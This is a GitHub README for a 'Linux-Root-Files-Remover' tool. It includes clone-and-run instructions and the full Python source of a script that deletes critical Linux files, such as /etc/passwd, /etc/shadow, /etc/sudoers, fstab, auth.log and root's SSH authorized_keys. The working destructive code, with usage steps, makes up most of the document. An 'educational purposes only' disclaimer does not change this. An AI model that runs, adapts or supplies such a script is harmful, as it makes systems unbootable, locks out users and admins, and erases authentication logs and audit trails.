<!--Linux-Root-Files-Remover -->

<p align="center">
  <img src="images.jpeg">
</p>

<h3><p align="center">Deleting Linux Root Files</p></h3>

This python script is used to delete critical system files and can cause a lot of damage if misused.

<h5><p align="center">How to Use This Script</p></h5>

<h3><p align="center">Run Python File</p></h3>

1. Install Python on your system if it is not already installed. You can download it from the official Python website.

2. Clone the repo to your device 

3. Open a terminal/command prompt and navigate to the directory where you saved the python file.

4. Run the python script using the command `Linux-Root.py`. This will execute the script and delete the files listed in the `files_to_delete` list.

<h3><p align="center">Run Bash File</p></h3>

- Just, Clone this repository -
  ```
  git clone https://github.com/7ussainnabeel/Linux-Root-Files.git
  ```

- Now go to cloned directory and run `Linux-Root.sh` -
  ```
  $ cd LINUX-ROOT-FILES
  $ bash Linux-Root.sh
  ```
##

<h3><p align="center">Code Explanation</p></h3>

```python
import os

files_to_delete = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/group",
    "/etc/sudoers",
    "/etc/ssh/sshd_config",
    "/etc/hosts",
    "/etc/network/interfaces",
    "/etc/fstab",
    "/etc/hostname",
    "/etc/resolv.conf",
    "/etc/securetty",
    "/etc/motd",
    "/var/log/auth.log",
    "/root/.ssh/authorized_keys",
    "/etc/hosts.allow",
    "/etc/hosts.deny",
    "/etc/crontab",
    "/etc/cron.d/",
    "/etc/passwd-",
    "/etc/shadow-",
]

for file in files_to_delete:
    if os.path.exists(file):
        os.remove(file)
        print(f"Deleted {file}")
    else:
        print(f"{file} does not exist")

The script first imports the os module which provides a way to interact with the system.

The files_to_delete list contains the file paths of the files that the script will delete.

The script then iterates over each file in the files_to_delete list. If the file exists, it is deleted using the os.remove() function. The print() function is used to display a message indicating whether the file was deleted successfully or not.

This Tool is made for educational purposes only. Do not attempt to violate the law with anything contained here. If this is your intention, then Get the hell out of here!